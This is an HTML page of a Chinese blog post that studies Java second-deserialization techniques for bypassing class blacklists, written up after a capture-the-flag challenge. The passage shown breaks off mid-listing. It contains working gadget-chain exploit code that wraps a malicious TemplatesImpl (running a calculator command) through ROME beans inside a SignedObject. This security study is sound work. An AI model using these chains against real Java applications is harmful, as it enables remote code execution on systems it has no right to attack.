<!DOCTYPE html>
<html itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
  <head>
    
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
    <meta name="robots" content="noodp" />
    <title>二次反序列化，看我一命通关 - 晨星_茯苓</title><meta name="author" content="晨星_茯苓">
<meta name="author-link" content="/about/">
<meta name="description" content="对 Java 二次反序列化学习研究整理" /><meta name="keywords" content='web security, 网络攻防' /><meta itemprop="name" content="二次反序列化，看我一命通关">
<meta itemprop="description" content="对 Java 二次反序列化学习研究整理"><meta itemprop="datePublished" content="2022-09-07T10:31:40+08:00" />
<meta itemprop="dateModified" content="2023-01-15T20:54:57+08:00" />
<meta itemprop="wordCount" content="3668"><meta itemprop="image" content="https://poriams.github.io/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/Zets/index/header.png">
<meta itemprop="keywords" content="" /><meta property="og:title" content="二次反序列化，看我一命通关" />
<meta property="og:description" content="对 Java 二次反序列化学习研究整理" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://poriams.github.io/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/" /><meta property="og:image" content="https://poriams.github.io/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/Zets/index/header.png"/><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-09-07T10:31:40+08:00" />
<meta property="article:modified_time" content="2023-01-15T20:54:57+08:00" />
<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://poriams.github.io/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/Zets/index/header.png"/>
<meta name="twitter:title" content="二次反序列化，看我一命通关"/>
<meta name="twitter:description" content="对 Java 二次反序列化学习研究整理"/>
<meta name="application-name" content="FixIt">
<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/favicon.jpg"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://poriams.github.io/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/" /><link rel="prev" href="https://poriams.github.io/%E6%84%BF%E5%A4%A9%E5%A0%82%E6%B2%A1%E6%9C%89java%E4%B9%8Bxml/" /><link rel="next" href="https://poriams.github.io/%E4%BB%8E-hexo-%E5%88%B0-hugo/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
  {
    "@context": "http://schema.org",
    "@type": "BlogPosting",
    "headline": "二次反序列化，看我一命通关",
    "inLanguage": "zh-CN",
    "mainEntityOfPage": {
      "@type": "WebPage",
      "@id": "https:\/\/poriams.github.io\/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3\/"
    },"image": [{
              "@type": "ImageObject",
              "url": "https:\/\/poriams.github.io\/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3\/Zets\/index\/header.png",
              "width":  767 ,
              "height":  315 
            }],"genre": "posts","wordcount":  3668 ,
    "url": "https:\/\/poriams.github.io\/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3\/","datePublished": "2022-09-07T10:31:40+08:00","dateModified": "2023-01-15T20:54:57+08:00","publisher": {
      "@type": "Organization",
      "name": "晨星_茯苓"},"author": {
        "@type": "Person",
        "name": "晨星_茯苓"
      },"description": ""
  }
  </script></head>
  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper"><header class="desktop animate__faster" id="header-desktop">
  <div class="header-wrapper">
    <div class="header-title">
      <a href="/" title="晨星_茯苓"><span class="header-title-pre"><i class='fa-solid fa-home fa-fw fa-sm'></i></span><span class="header-title-text">Poria Morningstar</span></a><span class="header-subtitle"></span></div>
    <nav>
      <ul class="menu"><li class="menu-item">
              <a
                class="menu-link"
                href="/posts/"
                
                
              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 文章</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/categories/"
                
                
              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/friends/"
                
                
              ><i class="fa-solid fa-users fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> 友链</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/about/"
                
                
              ><i class="fa-solid fa-info-circle fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
            <input type="text" placeholder="搜索文章标题或内容 ..." id="search-input-desktop">
            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
            </a>
            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
            </a>
            <span class="search-button search-loading" id="search-loading-desktop">
              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
            </span>
          </li><li class="menu-item theme-switch" title="切换主题">
          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
        </li>
      </ul>
    </nav>
  </div>
</header><header class="mobile animate__faster" id="header-mobile">
  <div class="header-container">
    <div class="header-wrapper">
      <div class="header-title">
        <a href="/" title="晨星_茯苓"><span class="header-title-pre"><i class='fa-solid fa-home fa-fw fa-sm'></i></span><span class="header-title-text">Poria Morningstar</span></a><span class="header-subtitle"></span></div>
      <div class="menu-toggle" id="menu-toggle-mobile">
        <span></span><span></span><span></span>
      </div>
    </div>
    <nav>
      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
            <div class="search mobile" id="search-mobile">
              <input type="text" placeholder="搜索文章标题或内容 ..." id="search-input-mobile">
              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
              </a>
              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
              </a>
              <span class="search-button search-loading" id="search-loading-mobile">
                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
              </span>
            </div>
            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
              取消
            </a>
          </li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/posts/"
                  
                  
                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 文章</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/categories/"
                  
                  
                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/friends/"
                  
                  
                ><i class="fa-solid fa-users fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> 友链</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/about/"
                  
                  
                ><i class="fa-solid fa-info-circle fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item theme-switch" title="切换主题">
          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
        </li></ul>
    </nav>
  </div>
</header><div class="search-dropdown desktop">
    <div id="search-dropdown-desktop"></div>
  </div>
  <div class="search-dropdown mobile">
    <div id="search-dropdown-mobile"></div>
  </div><main class="container" data-page-style="normal"><aside class="toc" id="toc-auto"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
      <div class="toc-content" id="toc-content-auto"></div></aside>

  <aside class="aside-custom">
    </aside>

  <article class="page single">
    <div class="header"><h1 class="single-title animate__animated animate__flipInX">
        <span>二次反序列化，看我一命通关</span>
      </h1></div><div class="post-meta">
      <div class="post-meta-line"><span class="post-author"><a href="/about/" title="作者" rel=" author" class="author"><img
    class="lazyload avatar"
    src="/svg/loading.min.svg"
    data-src="/avatar.jpg"
    data-srcset="/avatar.jpg, /avatar.jpg 1.5x, /avatar.jpg 2x"
    data-sizes="auto"
    alt="晨星_茯苓"
    title="晨星_茯苓"/>&nbsp;晨星_茯苓</a></span>
          <span class="post-category">收录于 <a href="/categories/javasec/"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> JavaSec</a></span></div>
      <div class="post-meta-line"><span title=2022-09-07&#32;10:31:40><i class="fa-regular fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-09-07">2022-09-07</time></span>&nbsp;<span><i class="fa-solid fa-pencil-alt fa-fw" aria-hidden="true"></i> 约 3668 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw" aria-hidden="true"></i> 预计阅读 8 分钟</span>&nbsp;<span class="comment-visitors" data-flag-title="二次反序列化，看我一命通关">
              <i class="fa-regular fa-eye fa-fw" aria-hidden="true"></i>&nbsp;<span data-path="/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/" class="waline-pageview-count">-</span>&nbsp;次阅读
            </span>&nbsp;<span class="comment-count" data-flag-title="二次反序列化，看我一命通关">
              <i class="fa-regular fa-comments fa-fw" aria-hidden="true"></i>&nbsp;<span data-path="/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/" class="waline-comment-count">-</span>&nbsp;条评论
            </span>&nbsp;</div>
    </div><div class="featured-image"><img
    class="lazyload"
    src="/svg/loading.min.svg"
    data-src="/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/Zets/index/header.png"
    data-srcset="/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/Zets/index/header.png, /%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/Zets/index/header.png 1.5x, /%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/Zets/index/header.png 2x"
    data-sizes="auto"
    alt="/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/Zets/index/header.png"
    title="/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/Zets/index/header.png"/></div><div class="details toc" id="toc-static" data-kept="false">
        <div class="details-summary toc-title">
          <span>目录</span>
          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
        </div>
        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li>
      <ul>
        <li><a href="#前言">前言</a></li>
        <li><a href="#signedobject">SignedObject</a>
          <ul>
            <li><a href="#原理">原理</a></li>
            <li><a href="#rome">rome</a>
              <ul>
                <li><a href="#tostringbean">ToStringBean</a></li>
                <li><a href="#equalsbean">EqualsBean</a></li>
              </ul>
            </li>
            <li><a href="#commons-beanutils">commons-beanutils</a>
              <ul>
                <li><a href="#beancomparator">BeanComparator</a></li>
              </ul>
            </li>
            <li><a href="#小结">小结</a></li>
          </ul>
        </li>
        <li><a href="#rmiconnector">RMIConnector</a>
          <ul>
            <li><a href="#原理-1">原理</a></li>
            <li><a href="#cc链">CC链</a>
              <ul>
                <li><a href="#invokertransformer">InvokerTransformer</a></li>
              </ul>
            </li>
            <li><a href="#小结-1">小结</a></li>
          </ul>
        </li>
        <li><a href="#wrapperconnectionpooldatasource">WrapperConnectionPoolDataSource</a>
          <ul>
            <li><a href="#原理-2">原理</a></li>
            <li><a href="#c3p0_hex">C3P0_Hex</a></li>
            <li><a href="#小结-2">小结</a></li>
          </ul>
        </li>
        <li><a href="#用到的工具类">用到的工具类</a></li>
        <li><a href="#结语">结语</a></li>
        <li><a href="#参考文章">参考文章</a></li>
      </ul>
    </li>
  </ul>
</nav></div>
      </div><div class="content" id="content"><p>对 Java 二次反序列化学习研究整理</p>
<h3 id="前言">前言</h3>
<p>不记得是哪一场比赛了，遇到了一个 Java 的题目，过滤了很多关键类，不管茯苓把 CC 链如何拆开组合，都没有办法绕过</p>
<p>就在此时，大佬看了一眼说，用二次反序列化就可以绕过了。“二次反序列化”这六个字重重地敲在了我的心巴上，从那以后我就对二次反序列化产生了莫名的渴望</p>
<p>茯苓开始详细学习时，发现没有二次反序列化比较系统的学习文章，那么，就自己总结一个</p>
<p>简单介绍下二次反序列化，顾名思义，就是反序列化两次，其主要意义是<strong>绕过黑名单的限制或不出网利用</strong></p>
<p>PS：本文用到的工具类会放在文末</p>
<h3 id="signedobject">SignedObject</h3>
<h4 id="原理">原理</h4>
<p>它，是<code>java.security</code>下一个用于创建真实运行时对象的类，更具体地说，<code>SignedObject</code>包含另一个<code>Serializable</code>对象。</p>
<p>太完美了，这个类简直是为二次反序列化而存在的，来关注下它的<code>getObject()</code></p>
<p><img
    class="lazyload"
    src="/svg/loading.min.svg"
    data-src="./Zets/index/image-20220809181727529.png"
    data-srcset="./Zets/index/image-20220809181727529.png, ./Zets/index/image-20220809181727529.png 1.5x, ./Zets/index/image-20220809181727529.png 2x"
    data-sizes="auto"
    alt="image-20220809181727529"
    title="image-20220809181727529"/></p>
<p>反序列化的内容也是可控</p>
<p><img
    class="lazyload"
    src="/svg/loading.min.svg"
    data-src="./Zets/index/image-20220809182131901.png"
    data-srcset="./Zets/index/image-20220809182131901.png, ./Zets/index/image-20220809182131901.png 1.5x, ./Zets/index/image-20220809182131901.png 2x"
    data-sizes="auto"
    alt="image-20220809182131901"
    title="image-20220809182131901"/></p>
<p>那么茯苓思路瞬间清晰了，先构造一个恶意<code>SignedObject</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">KeyPairGenerator</span> <span class="n">kpg</span> <span class="o">=</span> <span class="n">KeyPairGenerator</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="s">&#34;DSA&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl"><span class="n">kpg</span><span class="o">.</span><span class="na">initialize</span><span class="o">(</span><span class="mi">1024</span><span class="o">);</span>
</span></span><span class="line"><span class="cl"><span class="n">KeyPair</span> <span class="n">kp</span> <span class="o">=</span> <span class="n">kpg</span><span class="o">.</span><span class="na">generateKeyPair</span><span class="o">();</span>
</span></span><span class="line"><span class="cl"><span class="n">SignedObject</span> <span class="n">signedObject</span> <span class="o">=</span> <span class="k">new</span> <span class="n">SignedObject</span><span class="o">(</span><span class="err">恶意对象</span> <span class="err">用于第二次反序列化</span><span class="o">,</span> <span class="n">kp</span><span class="o">.</span><span class="na">getPrivate</span><span class="o">(),</span> <span class="n">Signature</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="s">&#34;DSA&#34;</span><span class="o">));</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后调用它的<code>getObject()</code>方法即可，那么现在压力来到了如何调用这个方法这边</p>
<h4 id="rome">rome</h4>
<h5 id="tostringbean">ToStringBean</h5>
<p>提到调用 getter 方法，茯苓第一个想到的就是 rome 反序列化，众所周知，rome 的<code>ToStringBean</code>的<code>toString()</code>方法可以办到这件事，理论上是可行的，实际也是可以构造的</p>
<p>因为<code>ObjectBean</code>其在实例化时会实例化三个 bean，这样构造出来的内容过分长了，茯苓不喜欢</p>
<p><del>大家可以自行构造试试</del>，茯苓绝不是那种不负责的人，还是给出例子，但不进行具体分析</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.sun.syndication.feed.impl.EqualsBean</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.sun.syndication.feed.impl.ObjectBean</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">javax.xml.transform.Templates</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.security.*</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.util.HashMap</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import static</span> <span class="nn">util.Tool.*</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">R_test</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span><span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">TemplatesImpl</span> <span class="n">obj</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TemplatesImpl</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="s">&#34;_bytecodes&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[][]{</span>
</span></span><span class="line"><span class="cl">                <span class="n">payload</span><span class="o">(</span><span class="s">&#34;mate-calc&#34;</span><span class="o">).</span><span class="na">toBytecode</span><span class="o">()});</span>
</span></span><span class="line"><span class="cl">        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="s">&#34;_name&#34;</span><span class="o">,</span> <span class="s">&#34;Poria&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="s">&#34;_tfactory&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">TransformerFactoryImpl</span><span class="o">());</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="n">HashMap</span> <span class="n">hashMap1</span> <span class="o">=</span> <span class="n">getpayload</span><span class="o">(</span><span class="n">Templates</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">obj</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">KeyPairGenerator</span> <span class="n">kpg</span> <span class="o">=</span> <span class="n">KeyPairGenerator</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="s">&#34;DSA&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">kpg</span><span class="o">.</span><span class="na">initialize</span><span class="o">(</span><span class="mi">1024</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">KeyPair</span> <span class="n">kp</span> <span class="o">=</span> <span class="n">kpg</span><span class="o">.</span><span class="na">generateKeyPair</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">        <span class="n">SignedObject</span> <span class="n">signedObject</span> <span class="o">=</span> <span class="k">new</span> <span class="n">SignedObject</span><span class="o">(</span><span class="n">hashMap1</span><span class="o">,</span> <span class="n">kp</span><span class="o">.</span><span class="na">getPrivate</span><span class="o">(),</span> <span class="n">Signature</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="s">&#34;DSA&#34;</span><span class="o">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">HashMap</span> <span class="n">hashMap2</span> <span class="o">=</span> <span class="n">getpayload</span><span class="o">(</span><span class="n">SignedObject</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">signedObject</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="n">run</span><span class="o">(</span><span class="n">hashMap2</span><span class="o">,</span> <span class="s">&#34;debug&#34;</span><span class="o">,</span> <span class="s">&#34;object&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="n">HashMap</span> <span class="nf">getpayload</span><span class="o">(</span><span class="n">Class</span> <span class="n">clazz</span><span class="o">,</span> <span class="n">Object</span> <span class="n">obj</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">ObjectBean</span> <span class="n">objectBean</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectBean</span><span class="o">(</span><span class="n">ObjectBean</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="k">new</span> <span class="n">ObjectBean</span><span class="o">(</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="s">&#34;rand&#34;</span><span class="o">));</span>
</span></span><span class="line"><span class="cl">        <span class="n">HashMap</span> <span class="n">hashMap</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">        <span class="n">hashMap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">objectBean</span><span class="o">,</span> <span class="s">&#34;rand&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">ObjectBean</span> <span class="n">expObjectBean</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectBean</span><span class="o">(</span><span class="n">clazz</span><span class="o">,</span> <span class="n">obj</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">objectBean</span><span class="o">,</span> <span class="s">&#34;_equalsBean&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">EqualsBean</span><span class="o">(</span><span class="n">ObjectBean</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">expObjectBean</span><span class="o">));</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">hashMap</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span> 
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="equalsbean">EqualsBean</h5>
<p>rome 链的关键转折点在于<code>pReadMethod.invoke(_obj,NO_PARAMS)</code>，<code>EqualsBean</code>也存在这个关键代码</p>
<p><img
    class="lazyload"
    src="/svg/loading.min.svg"
    data-src="./Zets/index/image-20220810093914403.png"
    data-srcset="./Zets/index/image-20220810093914403.png, ./Zets/index/image-20220810093914403.png 1.5x, ./Zets/index/image-20220810093914403.png 2x"
    data-sizes="auto"
    alt="image-20220810093914403"
    title="image-20220810093914403"/></p>
<p>那么茯苓可以利用珍藏多年的 CC7 链，利用<code>Hashtable</code>来触发<code>equals</code></p>
<p><img
    class="lazyload"
    src="/svg/loading.min.svg"
    data-src="./Zets/index/image-20220810094410681.png"
    data-srcset="./Zets/index/image-20220810094410681.png, ./Zets/index/image-20220810094410681.png 1.5x, ./Zets/index/image-20220810094410681.png 2x"
    data-sizes="auto"
    alt="image-20220810094410681"
    title="image-20220810094410681"/></p>
<p>这步是 CC7 的构造方式，因为要构造两遍，所以写为静态方法。</p>
<p><img
    class="lazyload"
    src="/svg/loading.min.svg"
    data-src="./Zets/index/image-20220810095018646.png"
    data-srcset="./Zets/index/image-20220810095018646.png, ./Zets/index/image-20220810095018646.png 1.5x, ./Zets/index/image-20220810095018646.png 2x"
    data-sizes="auto"
    alt="image-20220810095018646"
    title="image-20220810095018646"/></p>
<p>构造恶意<code>TemplatesImpl</code>，将其装入第一个<code>Hashtable</code></p>
<p><img
    class="lazyload"
    src="/svg/loading.min.svg"
    data-src="./Zets/index/image-20220810095408001.png"
    data-srcset="./Zets/index/image-20220810095408001.png, ./Zets/index/image-20220810095408001.png 1.5x, ./Zets/index/image-20220810095408001.png 2x"
    data-sizes="auto"
    alt="image-20220810095408001"
    title="image-20220810095408001"/></p>
<p>构造恶意<code>SignedObject</code>，将其装入第二个<code>Hashtable</code></p>
<p><img
    class="lazyload"
    src="/svg/loading.min.svg"
    data-src="./Zets/index/image-20220810100110091.png"
    data-srcset="./Zets/index/image-20220810100110091.png, ./Zets/index/image-20220810100110091.png 1.5x, ./Zets/index/image-20220810100110091.png 2x"
    data-sizes="auto"
    alt="image-20220810100110091"
    title="image-20220810100110091"/></p>
<p>最终 exp</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl</span><span class="o">;</span>
